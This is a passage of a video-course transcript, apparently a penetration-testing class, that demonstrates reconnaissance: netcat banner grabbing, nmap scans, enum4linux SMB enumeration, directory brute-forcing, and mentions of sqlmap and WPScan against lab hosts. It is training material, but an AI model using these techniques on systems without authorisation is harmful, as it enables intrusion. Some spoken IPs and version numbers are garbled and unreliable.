grabbing.\n\n494\n00:23:24.860 --> 00:23:29.630\nBasically what we mean by banner grabbing\nis, it's when you connect to a service,\n\n495\n00:23:29.630 --> 00:23:33.060\na lot of times it will talk back to you,\nwhen you make the connection and\n\n496\n00:23:33.060 --> 00:23:35.440\nsay hi, I'm service X.\n\n497\n00:23:35.440 --> 00:23:37.690\nAnd this is my version,\nand this is what I do.\n\n498\n00:23:37.690 --> 00:23:39.500\nAnd thanks for making a connection.\n\n499\n00:23:39.500 --> 00:23:40.200\nIt's going on.\n\n500\n00:23:40.200 --> 00:23:42.080\nAnd you're like okay, great.\n\n501\n00:23:43.140 --> 00:23:47.172\nUsually that's the client that's receiving\nthat, so you have some maybe a web front\n\n502\n00:23:47.172 --> 00:23:50.765\nend, or you've got a third party tool\nthat connects to a server in some way.\n\n503\n00:23:50.765 --> 00:23:54.711\nAnd they make that connection and you're\nnone the wiser, you just see the tool,\n\n504\n00:23:54.711 --> 00:23:57.748\nyou interact with your input data,\nit outputs information.\n\n505\n00:23:57.748 --> 00:24:00.147\nAnd then you are off to the races right?\n\n506\n00:24:00.147 --> 00:24:06.580\nWhat I want to do, through banner grabbing\nis find out the bits of information.\n\n507\n00:24:06.580 --> 00:24:07.760\nWhat is that service?\n\n508\n00:24:08.880 --> 00:24:11.470\nWhat anything else you want\nto tell me about yourself?\n\n509\n00:24:11.470 --> 00:24:13.260\nAnd that can be really helpful.\n\n510\n00:24:13.260 --> 00:24:17.710\nAgain we are building a picture of\nour target of what is going on there.\n\n511\n00:24:17.710 --> 00:24:19.799\nBecause we are going to eventually\nlook for vulnerabilities.\n\n512\n00:24:20.860 --> 00:24:22.610\nSo let us take a look at banner grabbing.\n\n513\n00:24:22.610 --> 00:24:26.560\nThe easy way to do banner grabbing is\nusing NetCat, our good old friend NC.\n\n514\n00:24:26.560 --> 00:24:28.830\nSo I am going to clear the screen.\n\n515\n00:24:30.820 --> 00:24:35.270\nAnd what I can do is if I scanned, looked,\nand found some services that are open,\n\n516\n00:24:35.270 --> 00:24:39.370\nmaybe somebody has port\n80 open of that nature.\n\n517\n00:24:39.370 --> 00:24:42.930\nI I can I can use NetCat\nto connect to that port.\n\n518\n00:24:42.930 --> 00:24:47.080\nThis is where I've talked about before you\ncan use TelNet to do the very same thing.\n\n519\n00:24:47.080 --> 00:24:52.196\nI find NetCat to be better at this because\nI can always kill the NetCat connection.\n\n520\n00:24:52.196 --> 00:24:56.880\nSometimes I have to actually close\nthe terminal to kill a TelNet connection.\n\n521\n00:24:56.880 --> 00:25:00.675\nThey get connected and\nit's like we're married for life.\n\n522\n00:25:00.675 --> 00:25:01.360\n&gt;&gt; [LAUGH]\n&gt;&gt; You know,\n\n523\n00:25:01.360 --> 00:25:04.010\nyou've got to kill one of them,\nto make it stop.\n\n524\n00:25:04.010 --> 00:25:07.330\nSo I typically stick with NetCat for this.\n\n525\n00:25:07.330 --> 00:25:12.280\nSo just NC NV just like we've done before.\n\n526\n00:25:12.280 --> 00:25:15.600\nAnd then, pick your host, so\nI'll just do the local host here.\n\n527\n00:25:15.600 --> 00:25:18.900\nAnd I think I might have some\nservices open, so like port 80,\n\n528\n00:25:18.900 --> 00:25:22.940\nC, return, yeah,\nI don't have, let me start.\n\n529\n00:25:22.940 --> 00:25:29.830\nI have a little script that starts\nmy services for me, myserver.sh.\n\n530\n00:25:29.830 --> 00:25:32.440\nAnd I will start them, and there we go.\n\n531\n00:25:32.440 --> 00:25:34.530\nLet's try that NetCat connection again.\n\n532\n00:25:34.530 --> 00:25:36.710\nThere we go.\nI didn't get a whole lot of information\n\n533\n00:25:36.710 --> 00:25:38.400\nout of this, there we go.\n\n534\n00:25:38.400 --> 00:25:41.910\nI did, I hit enter,\nbecause it wasn't really doing anything.\n\n535\n00:25:41.910 --> 00:25:44.300\nIt probably would have timed out,\nand the stuff would have came back.\n\n536\n00:25:44.300 --> 00:25:46.696\nBut look at all this\ninformation that I'm getting.\n\n537\n00:25:46.696 --> 00:25:50.762\nServer, Apache 2.4.25\nrunning on a WM machine.\n\n538\n00:25:50.762 --> 00:25:53.366\nSo that's a lot of information.\n\n539\n00:25:53.366 --> 00:25:55.340\n&gt;&gt; That's huge\n&gt;&gt; That's some very good information to be\n\n540\n00:25:55.340 --> 00:25:56.810\nhonest with you.\n\n541\n00:25:56.810 --> 00:25:58.320\nLet's see what else we see here.\n\n542\n00:25:59.920 --> 00:26:02.890\nI know that it's running HTML,\nokay that's great.\n\n543\n00:26:02.890 --> 00:26:05.415\nWe're running web,\nI know this actually a web server.\n\n544\n00:26:05.415 --> 00:26:07.600\n[LAUGH] And it gives me this,\n\n545\n00:26:07.600 --> 00:26:10.190\nyour browser sent a request that\nthe server cannot understand.\n\n546\n00:26:10.190 --> 00:26:11.850\nOkay, good for me.\n\n547\n00:26:11.850 --> 00:26:13.650\nMore information about that, port 80.\n\n548\n00:26:13.650 --> 00:26:17.910\nSo right out of the gate, I got a good\nbanner with some really good information.\n\n549\n00:26:17.910 --> 00:26:21.820\nI now know that that IP I found,\nand it is running port 80.\n\n550\n00:26:21.820 --> 00:26:25.020\nI thought it was a Web server,\nI verified it as a Web server.\n\n551\n00:26:25.020 --> 00:26:29.300\nIt is Apache Version 2.4.25,\nas a matter of fact,\n\n552\n00:26:29.300 --> 00:26:32.880\nrunning on a Debian system, right,\na lot of good information there.\n\n553\n00:26:32.880 --> 00:26:34.580\nSo this is banner grabbing.\n\n554\n00:26:34.580 --> 00:26:38.350\nYou can connect to any port\nthat you find to be open.\n\n555\n00:26:38.350 --> 00:26:41.370\nIf it was a mail server, Port 25 it.\n\n556\n00:26:41.370 --> 00:26:42.650\nSee what comes back.\n\n557\n00:26:42.650 --> 00:26:47.260\nWelcome to mail system such and\nsuch, version such and such.\n\n558\n00:26:47.260 --> 00:26:49.390\nSo a lot of good information.\n\n559\n00:26:49.390 --> 00:26:52.220\nLet's see here,\nlet's jump to server scanning.\n\n560\n00:26:52.220 --> 00:26:54.730\nHow do we find those open ports?\n\n561\n00:26:54.730 --> 00:26:57.010\nWelcome back to the kind, baby.\n\n562\n00:26:57.010 --> 00:26:59.390\nIt's nmap, he's back.\n\n563\n00:26:59.390 --> 00:27:01.120\nFor me it is the cat's meow.\n\n564\n00:27:01.120 --> 00:27:02.370\nThere are some other good ones.\n\n565\n00:27:02.370 --> 00:27:06.230\nI like Sparta or Spartan, it's a good one.\n\n566\n00:27:06.230 --> 00:27:10.300\nIt hooks into nmap,\nit's like a frontend, and\n\n567\n00:27:10.300 --> 00:27:13.200\ninto other scanners,\ndoes an all in one thing.\n\n568\n00:27:13.200 --> 00:27:17.190\nSo let's just run nmap, nmap dash.\n\n569\n00:27:17.190 --> 00:27:19.600\nThe default is -ss,\nwhich is a stealth scan.\n\n570\n00:27:20.650 --> 00:27:25.930\nIt's not a full TCP connection,\nit's like a half connection.\n\n571\n00:27:25.930 --> 00:27:26.700\nAnd then your target, 102.168.\n\n572\n00:27:26.700 --> 00:27:31.630\nOr no, I'll do the I'll do this one,\n127 local host, and make it easy.\n\n573\n00:27:31.630 --> 00:27:34.780\nAnd badabing, it runs.\n\n574\n00:27:34.780 --> 00:27:37.360\nLook, I find port 21 is open.\n\n575\n00:27:37.360 --> 00:27:38.590\nI find port 22 is open.\n\n576\n00:27:38.590 --> 00:27:39.660\nNot only that,\n\n577\n00:27:39.660 --> 00:27:44.390\nit tells me that these are typically these\nservices that are found on these ports.\n\n578\n00:27:44.390 --> 00:27:46.590\nWhat else can we do?\n\n579\n00:27:46.590 --> 00:27:49.350\nIf you're having trouble, Stealth scan's\nnot really giving you the information\n\n580\n00:27:49.350 --> 00:27:52.130\nyou're looking for, there's a couple\nother scans you typically might try.\n\n581\n00:27:53.560 --> 00:27:56.530\nOne is a, like a UDP scan.\n\n582\n00:27:56.530 --> 00:27:59.040\nI will not run this scan\nbecause they take forever.\n\n583\n00:27:59.040 --> 00:28:00.950\nBe warned, they take forever.\n\n584\n00:28:00.950 --> 00:28:02.250\nI don't care.\n\n585\n00:28:02.250 --> 00:28:03.170\nMy goodness.\n\n586\n00:28:03.170 --> 00:28:06.460\nI think the fastest one I\never ran was like 18 minutes.\n\n587\n00:28:06.460 --> 00:28:09.060\nA little long for the show.\n\n588\n00:28:09.060 --> 00:28:10.980\nBut that will scan UDP ports.\n\n589\n00:28:10.980 --> 00:28:12.950\nDo not leave that out of your enumeration.\n\n590\n00:28:12.950 --> 00:28:18.015\nDo that scan when you\nare scanning systems, okay.\n\n591\n00:28:18.015 --> 00:28:19.455\nDo every scan that you have time to do.\n\n592\n00:28:19.455 --> 00:28:23.975\nRight, doesn't mean you can't get started,\nbut do all the scans.\n\n593\n00:28:23.975 --> 00:28:26.275\nAlso another one is good,\nis a Christmas scan, or\n\n594\n00:28:26.275 --> 00:28:30.185\nan Xmas scan,\nwhere it tries some different flags.\n\n595\n00:28:31.370 --> 00:28:34.830\nIf you want to really get in\ndepth with NMap, guess what?\n\n596\n00:28:34.830 --> 00:28:37.410\nIT Pro TV actually has a show on that.\n\n597\n00:28:37.410 --> 00:28:41.360\nWith NMap give you a whole lot more\ndetail on how to work with NMao,\n\n598\n00:28:41.360 --> 00:28:42.170\nget a lot out of it.\n\n599\n00:28:42.170 --> 00:28:44.310\nCuz this is a very, very powerful tool.\n\n600\n00:28:44.310 --> 00:28:45.030\nSo check that out.\n\n601\n00:28:46.360 --> 00:28:47.720\nAnd I can fire that off.\n\n602\n00:28:47.720 --> 00:28:54.990\nIt's basically gonna give sync\nkind of information here.\n\n603\n00:28:54.990 --> 00:28:56.664\nThere you go, 21 22 80 111.\n\n604\n00:28:56.664 --> 00:28:59.240\nLet's talk about SMB enumeration.\n\n605\n00:28:59.240 --> 00:29:02.230\nYou will notice I am not\nrunning any SMB here.\n\n606\n00:29:02.230 --> 00:29:04.470\nI do have RPC bind.\n\n607\n00:29:04.470 --> 00:29:07.360\nBut not SMB, that I know of.\n\n608\n00:29:07.360 --> 00:29:13.250\nTypically, I bet I do know one that's\nopened now, is that Windows machine.\n\n609\n00:29:13.250 --> 00:29:16.995\nSo 192, let me reconnect over here and\nget the right network going.\n\n610\n00:29:16.995 --> 00:29:20.736\n192.168.219.168 if I remember correctly.\n\n611\n00:29:20.736 --> 00:29:25.570\nAnd let's run that,\n\n612\n00:29:25.570 --> 00:29:30.060\nsee what kind of information\nthat comes out of there.\n\n613\n00:29:30.060 --> 00:29:31.300\nBecause it's a Windows machine,\n\n614\n00:29:31.300 --> 00:29:36.840\nI'm also guaranteed to find\nsomething with SNB right?\n\n615\n00:29:36.840 --> 00:29:38.350\nThis is the 139, 138,\n137, and I think fourth.\n\n616\n00:29:38.350 --> 00:29:39.700\n45 ports.\n\n617\n00:29:40.940 --> 00:29:44.940\nSo if I find any of that, look at that,\nthe Windows Firewall, it's doing its job.\n\n618\n00:29:44.940 --> 00:29:45.840\nGood job, Windows Firewall.\n\n619\n00:29:45.840 --> 00:29:47.570\nSee, it's not a piece of junk.\n\n620\n00:29:47.570 --> 00:29:48.950\nIt's a good system, right?\n\n621\n00:29:48.950 --> 00:29:53.710\nIf I were to turn that off we\nwould definitely see those ports.\n\n622\n00:29:53.710 --> 00:29:54.840\n445 is a great one.\n\n623\n00:29:54.840 --> 00:29:57.180\nWhen you find a Windows machine,\n\n624\n00:29:57.180 --> 00:30:00.220\none of the things you wanna do\nis enumerate the SMB right?\n\n625\n00:30:00.220 --> 00:30:03.010\nSo let me do,\nlet me turn off the firewall.\n\n626\n00:30:03.010 --> 00:30:04.320\nYou're like, turn off the firewall?\n\n627\n00:30:04.320 --> 00:30:06.230\nMan you're making it easy.\n\n628\n00:30:06.230 --> 00:30:08.560\nOkay, I wanna address this really quickly.\n\n629\n00:30:08.560 --> 00:30:10.180\nI know we're running out of time.\n\n630\n00:30:10.180 --> 00:30:13.700\nYes, it is easy for me to turn off\nthe firewall and show you something.\n\n631\n00:30:13.700 --> 00:30:16.960\nGuess what, there are people out there in\nthe wild and their firewall is turned off.\n\n632\n00:30:16.960 --> 00:30:19.320\nThey are not running that firewall.\n\n633\n00:30:19.320 --> 00:30:23.190\nSo why would I not scan and\nlook for those people?\n\n634\n00:30:23.190 --> 00:30:24.550\nIt's the low-hanging fruit.\n\n635\n00:30:24.550 --> 00:30:25.060\n&gt;&gt; Exactly.\n\n636\n00:30:25.060 --> 00:30:25.940\n&gt;&gt; That's what I want.\nThat's,\n\n637\n00:30:25.940 --> 00:30:29.180\nas a pen tester, I'm an organization,\nsomebody got smart and\n\n638\n00:30:29.180 --> 00:30:32.250\nfigured out the firewall was blocking them\nfrom getting to their favorite thing.\n\n639\n00:30:32.250 --> 00:30:33.160\nAnd they shut it off.\n\n640\n00:30:33.160 --> 00:30:37.350\nAnd now I'm pen testing, Hey look,\nguy's got his firewall off.\n\n641\n00:30:37.350 --> 00:30:38.920\nFirewalls get turned off.\n\n642\n00:30:38.920 --> 00:30:42.950\nSo it's not unrealistic to think that\nyou're going to come across a computer\n\n643\n00:30:42.950 --> 00:30:45.870\nwhere the firewall is not enabled,\nor misconfigured.\n\n644\n00:30:45.870 --> 00:30:47.230\n&gt;&gt; Or, yeah, at least misconfigured.\n\n645\n00:30:47.230 --> 00:30:50.280\nAnd they've got the public interface\nlisted as a private interface, so\n\n646\n00:30:50.280 --> 00:30:53.700\nit's opening up all kinds of ports and\nyou got to try and take advantage of that.\n\n647\n00:30:53.700 --> 00:30:55.260\nLike you said, the low, hanging fruit.\n\n648\n00:30:55.260 --> 00:30:55.840\n&gt;&gt; Exactly.\n\n649\n00:30:55.840 --> 00:30:56.720\nThat's what you're looking for,\n\n650\n00:30:56.720 --> 00:30:59.130\nit's always going to be\nyour Inroad into a system.\n\n651\n00:30:59.130 --> 00:30:59.920\nGrab the easy stuff.\n\n652\n00:30:59.920 --> 00:31:01.690\nSo I'm just gonna turn the firewall off.\n\n653\n00:31:01.690 --> 00:31:03.500\nAnd go to the Windows firewall.\n\n654\n00:31:03.500 --> 00:31:06.100\nCuz I want you guys to see that output.\n\n655\n00:31:06.100 --> 00:31:06.820\nIt is turned off.\n\n656\n00:31:06.820 --> 00:31:09.330\nWhy wasn't it showing me anything?\n\n657\n00:31:09.330 --> 00:31:10.360\nMaybe I did the wrong IP address.\n\n658\n00:31:10.360 --> 00:31:13.250\nLet's see here.\n\n659\n00:31:14.800 --> 00:31:15.580\nIpconfig.\n\n660\n00:31:15.580 --> 00:31:16.470\nI'm in Windows.\n\n661\n00:31:16.470 --> 00:31:20.470\n168, did I not do that right?\n\n662\n00:31:20.470 --> 00:31:21.790\n168, but it's showing I'm not closed.\n\n663\n00:31:22.950 --> 00:31:29.240\nI was having trouble with that earlier,\nso let me try it from here.\n\n664\n00:31:29.240 --> 00:31:31.700\nSo nmap -ss 192.168.219.168 let's\n\n665\n00:31:33.810 --> 00:31:38.580\nsee if this doesn't glean anymore.\n\n666\n00:31:38.580 --> 00:31:45.520\nI've got to sudo that.\n\n667\n00:31:45.520 --> 00:31:47.190\nControl s control a.\n\n668\n00:31:47.190 --> 00:31:48.580\nSudo, you're seeing the real, there we go.\n\n669\n00:31:48.580 --> 00:31:49.080\nSo there we go.\n\n670\n00:31:50.360 --> 00:31:51.323\nThere's four for five open.\n\n671\n00:31:51.323 --> 00:31:55.626\nSo now I now enumeration, I want to\nfind out what's going on with that.\n\n672\n00:31:55.626 --> 00:32:02.035\nSo we jump back to my Linux machine\nhere And I can use enum4linux.\n\n673\n00:32:02.035 --> 00:32:04.030\nenum-\n&gt;&gt; Love it.\n\n674\n00:32:04.030 --> 00:32:06.702\n&gt;&gt; Yeah, let me clear the screen.\n\n675\n00:32:06.702 --> 00:32:10.998\nenum4linux, like so, right?\n\n676\n00:32:10.998 --> 00:32:13.270\nDo a -a just to throw everything and\nthe kitchen sink.\n\n677\n00:32:13.270 --> 00:32:14.090\nThat's what I like to do.\n\n678\n00:32:14.090 --> 00:32:15.300\nI don't care about Internet traffic.\n\n679\n00:32:15.300 --> 00:32:18.240\nEspecially when I got\npermission to pen test.\n\n680\n00:32:18.240 --> 00:32:19.740\nSo I don't care about traffic.\n\n681\n00:32:19.740 --> 00:32:25.250\nAnd then the host 192.168.029.0168.\n\n682\n00:32:25.250 --> 00:32:26.080\nThere we go.\n\n683\n00:32:26.080 --> 00:32:28.150\nAnd look,\ngetting all sorts of great information.\n\n684\n00:32:28.150 --> 00:32:32.710\nYou could have done this manually using,\nwhat is it, NBT stat tool?\n\n685\n00:32:32.710 --> 00:32:34.720\nBut that would have been a lot of work.\n\n686\n00:32:34.720 --> 00:32:36.280\nThis does it for me through scripts.\n\n687\n00:32:36.280 --> 00:32:38.960\nI think it's a Python script or something.\n\n688\n00:32:38.960 --> 00:32:40.081\nBut let's see.\n\n689\n00:32:40.081 --> 00:32:42.824\nLook, it's Windows 7 Professional 6.1.\n\n690\n00:32:44.200 --> 00:32:45.770\nThere's the computer name.\n\n691\n00:32:45.770 --> 00:32:46.560\nWhy did I do that?\n\n692\n00:32:46.560 --> 00:32:47.060\nI don't know.\n\n693\n00:32:48.670 --> 00:32:52.160\nAnd information.\n\n694\n00:32:52.160 --> 00:32:53.190\nI didn't get any.\n\n695\n00:32:53.190 --> 00:32:55.990\nI wasn't able to glean any passwords.\n\n696\n00:32:55.990 --> 00:32:59.130\nI wasn't able to create,\nsay, a null session.\n\n697\n00:32:59.130 --> 00:33:00.730\nWhich would've been a great.\n\n698\n00:33:00.730 --> 00:33:03.690\nBut I did get some interesting\ninformation out of here.\n\n699\n00:33:03.690 --> 00:33:05.340\nLike that I know that\nit's running Windows 7.\n\n700\n00:33:05.340 --> 00:33:06.270\nThat's great for me to know.\n\n701\n00:33:06.270 --> 00:33:08.610\nSo now I can start curtailing my attacks.\n\n702\n00:33:09.610 --> 00:33:11.080\n&gt;&gt; Yeah, that's a really good one to run.\n\n703\n00:33:11.080 --> 00:33:14.510\nSMB can sometimes give\nup a lot of information.\n\n704\n00:33:14.510 --> 00:33:15.940\n&gt;&gt; Yeah, tons of stuff.\n\n705\n00:33:15.940 --> 00:33:18.250\nThat is one,\nif you're attacking Windows machines.\n\n706\n00:33:18.250 --> 00:33:19.920\nIf you're targeting a Windows machine.\n\n707\n00:33:19.920 --> 00:33:21.428\nYou wanna run enum4linux.\n\n708\n00:33:21.428 --> 00:33:23.390\nThat's a must-have.\n\n709\n00:33:23.390 --> 00:33:26.130\nAll right,\nnow let's move to web directory discovery.\n\n710\n00:33:26.130 --> 00:33:29.095\nA lot of times websites like to hide\ndirectories that you can actually access.\n\n711\n00:33:29.095 --> 00:33:31.110\nThey just hide them.\n\n712\n00:33:31.110 --> 00:33:32.740\nSo you think, there's good security.\n\n713\n00:33:32.740 --> 00:33:33.590\n&gt;&gt; No links to it.\n\n714\n00:33:33.590 --> 00:33:34.750\nNobody's ever gonna get there.\n\n715\n00:33:34.750 --> 00:33:35.410\n&gt;&gt; I've hidden it.\n\n716\n00:33:35.410 --> 00:33:37.060\nIt's ha-ha!\n\n717\n00:33:37.060 --> 00:33:37.760\nTake that.\n\n718\n00:33:37.760 --> 00:33:38.340\nWell guess what?\n\n719\n00:33:38.340 --> 00:33:42.940\nI can just basically crank out\na list of common Web directories.\n\n720\n00:33:42.940 --> 00:33:45.630\nAnd see if any of them come up.\n\n721\n00:33:45.630 --> 00:33:46.290\nSo that's what we'll do.\n\n722\n00:33:46.290 --> 00:33:52.210\nWe can use Dirb, it's short for\nDirBuster or directory buster.\n\n723\n00:33:52.210 --> 00:33:54.810\nThere's also GoBuster,\nworks very similarly.\n\n724\n00:33:54.810 --> 00:33:57.230\nAnd those are my two favorites.\n\n725\n00:33:57.230 --> 00:33:58.490\nSo let's stick with that.\n\n726\n00:33:58.490 --> 00:34:03.083\nBasically DirBuster,\n\n727\n00:34:03.083 --> 00:34:06.540\nlet's see here.\n\n728\n00:34:06.540 --> 00:34:10.000\nLet me go back to,\nwe are on ethernet 0, that's good.\n\n729\n00:34:10.000 --> 00:34:10.510\nSo let's do, drrb.\n\n730\n00:34:10.510 --> 00:34:14.427\nAnd I think you just throw the host at it,\nyeah, 192.168.2190146.\n\n731\n00:34:14.427 --> 00:34:15.725\nI'll attack my own machine.\n\n732\n00:34:16.855 --> 00:34:20.739\nAnd it did not like that for some reason.\n\n733\n00:34:20.739 --> 00:34:22.621\nI have to do it in HTTP.\n\n734\n00:34:22.621 --> 00:34:25.797\n[LAUGH] Yeah, add that part,\nhttp: like that.\n\n735\n00:34:25.797 --> 00:34:27.085\nThere it goes.\n\n736\n00:34:27.085 --> 00:34:31.775\nSo it is just cranking through\ndirectories looking for any directories.\n\n737\n00:34:31.775 --> 00:34:34.040\nIt has got a word list file basically.\n\n738\n00:34:34.040 --> 00:34:36.080\nSaying, here's a list\nof common directories.\n\n739\n00:34:36.080 --> 00:34:37.570\nSee if any of these actually turn up.\n\n740\n00:34:37.570 --> 00:34:40.350\nAnd you'll notice that it\nactually did find some.\n\n741\n00:34:40.350 --> 00:34:42.230\nSo there you go.\nFound one for JavaScript.\n\n742\n00:34:43.970 --> 00:34:48.440\nIt found another one that was entering\nthat JavaScript, looking for other stuff.\n\n743\n00:34:48.440 --> 00:34:49.820\njQuery was there.\n\n744\n00:34:49.820 --> 00:34:52.110\nSometimes you'll find those good things.\n\n745\n00:34:52.110 --> 00:34:55.340\nAnd you can just go into your web browser,\ntype that URL in.\n\n746\n00:34:55.340 --> 00:34:57.360\nAnd you can search that directory.\n\n747\n00:34:57.360 --> 00:34:58.770\nVery simple.\n\n748\n00:34:58.770 --> 00:35:00.178\nAll right, so that being said.\n\n749\n00:35:00.178 --> 00:35:01.680\nWe'll go to our last thing.\n\n750\n00:35:01.680 --> 00:35:05.340\nVulnerability scanning and\nweb vulnerability scanning.\n\n751\n00:35:05.340 --> 00:35:08.413\nThe heavy hitters of\nvulnerability scanning.\n\n752\n00:35:08.413 --> 00:35:10.480\nNessus, huge, been around forever.\n\n753\n00:35:10.480 --> 00:35:11.520\nUsed to be free and was awesome.\n\n754\n00:35:11.520 --> 00:35:12.850\nNow it costs a little bit of money.\n\n755\n00:35:12.850 --> 00:35:14.920\nI think you can get a free version of it.\n\n756\n00:35:14.920 --> 00:35:16.360\n&gt;&gt; I believe you,\nI know you can do a trial.\n\n757\n00:35:16.360 --> 00:35:18.155\n&gt;&gt; Yes, a trial, there you go.\n\n758\n00:35:18.155 --> 00:35:20.080\nOpenVAS, another big heavy hitter.\n\n759\n00:35:20.080 --> 00:35:22.030\nGreat piece of software.\n\n760\n00:35:22.030 --> 00:35:23.000\nWe're not going to get into that.\n\n761\n00:35:23.000 --> 00:35:25.420\nThey are shows in and of themselves.\n\n762\n00:35:25.420 --> 00:35:26.300\nI just noticed something.\n\n763\n00:35:26.300 --> 00:35:29.250\nLarry in the chatroom said robots.txt.\n\n764\n00:35:29.250 --> 00:35:30.464\nThat's a good one to know.\n\n765\n00:35:30.464 --> 00:35:31.760\n&gt;&gt; [LAUGH].\n&gt;&gt; So if your DirBuster or\n\n766\n00:35:31.760 --> 00:35:32.640\nGoBuster finds that.\n\n767\n00:35:33.920 --> 00:35:36.100\nThat's good stuff, look at that file.\n\n768\n00:35:36.100 --> 00:35:38.160\nBut back to vulnerability scanners.\n\n769\n00:35:38.160 --> 00:35:42.440\nWe did Nessus, OpenVAS,\nNmap is actually a vulnerability scanner.\n\n770\n00:35:42.440 --> 00:35:45.610\nIt has a table of vulnerabilities\nthat it can look for\n\n771\n00:35:45.610 --> 00:35:48.300\nusing the Nmap scripting engine, the NSE.\n\n772\n00:35:48.300 --> 00:35:50.240\nAnd then, of course, Metasploit.\n\n773\n00:35:50.240 --> 00:35:53.460\nNo list of vulnerability scanners\nis complete without Metasploit.\n\n774\n00:35:53.460 --> 00:35:57.140\nWe are not going to use\nMetasploit in this class.\n\n775\n00:35:57.140 --> 00:35:59.240\nWe're gonna use one portion of it for\n\n776\n00:35:59.240 --> 00:36:02.070\na very short amount of time for\none specific thing.\n\n777\n00:36:02.070 --> 00:36:03.100\nBut we're not using Metasploit.\n\n778\n00:36:03.100 --> 00:36:04.920\nWe're going to do it the hard way.\n\n779\n00:36:04.920 --> 00:36:06.840\nThat's what we like to do here.\n\n780\n00:36:06.840 --> 00:36:08.430\nSo that if you don't have Metasploit.\n\n781\n00:36:08.430 --> 00:36:09.980\nYou can still do these things.\n\n782\n00:36:09.980 --> 00:36:10.890\nAnd if you do have Metasploit.\n\n783\n00:36:10.890 --> 00:36:13.410\nYou now know what's happening\nunderneath the hood.\n\n784\n00:36:13.410 --> 00:36:15.530\nThat's what our purpose is.\n\n785\n00:36:15.530 --> 00:36:19.100\nAnd then web, Nikto, I love Nikto.\n\n786\n00:36:19.100 --> 00:36:20.300\nMan, that's a great scanner.\n\n787\n00:36:20.300 --> 00:36:24.740\nIt basically scans websites for\nknown vulnerabilities.\n\n788\n00:36:24.740 --> 00:36:26.465\nAnd then outputs that to you.\n\n789\n00:36:26.465 --> 00:36:28.366\nAnd let's take a look, I'll show you some.\n\n790\n00:36:28.366 --> 00:36:32.810\nLet's attack a list of which one.\n\n791\n00:36:32.810 --> 00:36:40.090\nLet's go to [SOUND] let's look at PalmLab.\n\n792\n00:36:40.090 --> 00:36:43.949\nUnless I know I've got\na cat PalmLab Nikto.\n\n793\n00:36:43.949 --> 00:36:45.020\nAnd there you go.\n\n794\n00:36:45.020 --> 00:36:48.580\nSo it starts telling you, look,\nthere's a login.php page.\n\n795\n00:36:48.580 --> 00:36:52.830\nA cookie PHP session ID created\nwithout an HTTP only flag.\n\n796\n00:36:52.830 --> 00:36:56.920\nSo it starts giving you\ninformation about these machines.\n\n797\n00:36:56.920 --> 00:36:58.190\nThat they don't really want you to know.\n\n798\n00:36:58.190 --> 00:36:59.573\nAny of the vulnerabilities that it finds.\n\n799\n00:36:59.573 --> 00:37:00.390\nIt pops that out for you.\n\n800\n00:37:00.390 --> 00:37:02.325\nAnd you can start\nattacking those weak spots.\n\n801\n00:37:02.325 --> 00:37:04.930\nSQLmap, great stuff.\n\n802\n00:37:04.930 --> 00:37:08.330\nSQL Injection, it is hard and difficult.\n\n803\n00:37:08.330 --> 00:37:11.870\nBecause it's a lot of guessing and\nhoping that things will work.\n\n804\n00:37:13.090 --> 00:37:16.300\nSqlmap takes out all of\nthe difficulty of it.\n\n805\n00:37:16.300 --> 00:37:17.640\nYou just run SQLmap against something.\n\n806\n00:37:17.640 --> 00:37:21.010\nAnd it says, here's all the\nvulnerabilities I've found and exploited.\n\n807\n00:37:21.010 --> 00:37:22.080\nDo with it as you will.\n\n808\n00:37:22.080 --> 00:37:24.240\nIt is a scary piece of software.\n\n809\n00:37:24.240 --> 00:37:26.200\nAnd last but not least, WPScan.\n\n810\n00:37:26.200 --> 00:37:29.050\nWordpress is a huge thing.\n\n811\n00:37:29.050 --> 00:37:32.130\nA lot of Wordpress sites\non the Internet today.\n\n812\n00:37:32.130 --> 00:37:35.410\nWPScan is kind of like SQLmap.\n\n813\n00:37:35.410 --> 00:37:36.440\nIt's stinking scary.\n\n814\n00:37:36.440 --> 00:37:37.960\nIt finds stuff.\n\n815\n00:37:37.960 --> 00:37:40.735\nUsernames, passwords, crappy logins.\n\n816\n00:37:40.735 --> 00:37:44.570\nIt will crack passwords for\nyou so that you can gain access.\n\n817\n00:37:44.570 --> 00:37:46.630\nGreat tools, jump on those.\n\n818\n00:37:46.630 --> 00:37:48.290\nWe're gonna use them throughout.\n\n819\n00:37:48.290 --> 00:37:51.030\nThat's why I'm not kind of like\nwalking you through each one.\n\n820\n00:37:51.030 --> 00:37:53.020\nHere's how you do this,\nand here's another option.\n\n821\n00:37:53.020 --> 00:37:55.420\nWe're gonna be using them\nthroughout the series.\n\n822\n00:37:55.420 --> 00:37:57.880\nSo you will see them work.\n\n823\n00:37:57.880 --> 00:37:58.450\n&gt;&gt; I'm excited.\n\n824\n00:37:58.450 --> 00:38:00.190\nCan't wait to see all of that.\n\n825\n00:38:00.190 --> 00:38:02.030\nBut we do thank you Daniel.\n\n826\n00:38:02.030 --> 00:38:04.390\nWe got a good look there at\nthe scanning and enumeration.\n\n827\n00:38:04.390 --> 00:38:06.208\nWe looked at a scanning machines.\n\n828\n00:38:06.208 --> 00:38:08.890\nAnd doing port scanning,\ndoing enumeration.\n\n829\n00:38:08.890 --> 00:38:11.970\nTook a look at enumerating some SMB.\n\n830\n00:38:11.970 --> 00:38:14.600\nWe also took a look at banner grabbing.\n\n831\n00:38:14.600 --> 00:38:18.450\nA very important concept,\nbecause you might see a port's open.\n\n832\n00:38:18.450 --> 00:38:20.650\nAnd you know, okay, that's port 80.\n\n833\n00:38:20.650 --> 00:38:22.000\nIt's a web server.\n\n834\n00:38:22.000 --> 00:38:23.150\nBut I need to know more than that.\n\n835\n00:38:23.150 --> 00:38:26.810\nIf I'm gonna find a vulnerability\nthat I can try to exploit.\n\n836\n00:38:26.810 --> 00:38:29.220\nI need to know what web\nservice it's running.\n\n837\n00:38:29.220 --> 00:38:30.790\nWhat version it's running.\n\n838\n00:38:30.790 --> 00:38:35.373\nThis vulnerability or\nthis exploit might work against Apache 7.\n\n839\n00:38:35.373 --> 00:38:37.990\nBut not Apache 8 or 9.\n\n840\n00:38:37.990 --> 00:38:40.102\nRight?\nSo I need to know those version numbers.\n\n841\n00:38:40.102 --> 00:38:42.640\nBanner grabbing is the way to do that.\n\n842\n00:38:42.640 --> 00:38:45.160\nAnd then we talked about some of\nthe different server scanning.\n\n843\n00:38:45.160 --> 00:38:48.290\nAs well as vulnerability scanning,\nsome great tools there.\n\n844\n00:38:48.290 --> 00:38:49.962\nNessus, I know is a great one.\n\n845\n00:38:49.962 --> 00:38:53.250\nNikto, a great one for scanning websites\nand finding those 